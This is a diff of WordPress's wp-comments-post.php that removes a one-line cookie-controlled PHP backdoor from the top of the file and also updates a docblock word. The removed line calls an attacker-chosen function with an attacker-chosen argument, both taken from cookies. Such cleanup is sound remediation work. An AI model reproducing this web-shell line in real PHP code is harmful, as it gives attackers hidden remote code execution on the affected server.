@@ -1,8 +1,4 @@
 <?php
-
-if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
-
-
 /**
  * Handles Comment Post to WordPress and prevents duplicate comment posting.
  *
@@ -46,7 +42,7 @@ do_action( 'set_comment_cookies', $comment, $user );
 $location = empty( $_POST['redirect_to'] ) ? get_comment_link( $comment ) : $_POST['redirect_to'] . '#comment-' . $comment->comment_ID;
 
 /**
- * Filter the location URI to send the commenter after posting.
+ * Filters the location URI to send the commenter after posting.
  *
  * @since 2.0.5
  *
